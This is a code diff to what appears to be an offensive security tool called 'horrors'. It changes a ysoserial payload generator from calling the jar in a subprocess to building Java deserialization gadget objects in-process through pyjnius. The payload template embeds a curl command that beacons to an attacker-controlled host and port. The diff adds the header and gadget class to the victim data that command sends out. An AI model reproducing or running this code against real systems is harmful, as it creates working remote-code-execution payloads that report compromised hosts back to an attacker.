@@ -1,6 +1,8 @@
-import pathlib
+import os
 import string
-import subprocess
+
+import jnius_config
+
 
 from horrors import (
     logging,
@@ -10,7 +12,7 @@ from horrors import (
 
 class YsoserialPayload(templates.Template):
     template_context = {
-        'SHELL_EXEC': 'curl \"http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST&bypass_id=$BYPASS_ID\"',
+        'SHELL_EXEC': 'curl \"http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST&bypass_id=$BYPASS_ID&header=$HEADER&type=$CLASS\"',
     }
 
     PAYLOAD_CLASSES = [
@@ -26,17 +28,27 @@ class YsoserialPayload(templates.Template):
 
     def __init__(self, config):
         self.config = config
+        if not jnius_config.vm_running:
+            if not os.environ.get('JVM_PATH'):
+                try:
+                    os.environ['JVM_PATH'] = config.JVM_LIB
+                except AttributeError:
+                    logging.debug('JVM lib path isn\'t defined in env PATH or in config file.')
+
+        try:
+            if config.YSOSERIAL not in jnius_config.get_classpath():
+                jnius_config.add_classpath(config.YSOSERIAL)
+        except AttributeError:
+            logging.debug('YSOSERIAL jar path isn\'t defined in config file.')
 
     def generate(self, request_context):
+        from jnius import autoclass
         # FIXME: Optimize
         context = self.template_context.copy()
         for key, val in context.items():
             context[key] = string.Template(val).substitute(request_context)
-        java = pathlib.Path(self.config.JAVA)
-        ysoserial = pathlib.Path(self.config.YSOSERIAL)
-        p = subprocess.Popen([java, '-jar', ysoserial, request_context['CLASS'], context['SHELL_EXEC']], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        ser_object = p.stdout.read().decode()
-        logging.debug('Ysoserial output: ' + ser_object)
-        if p.wait():
-            raise Exception('Ysoserial payload generation error.')
-        return bytes.fromhex(ser_object)
+        payload = autoclass(f'ysoserial.payloads.{request_context["CLASS"]}')()
+        object = payload.getObject(context['SHELL_EXEC'])
+        ser_object = autoclass('ysoserial.Serializer').serialize(object)
+        logging.debug(b'Ysoserial output: ' + ser_object.tostring())
+        return ser_object
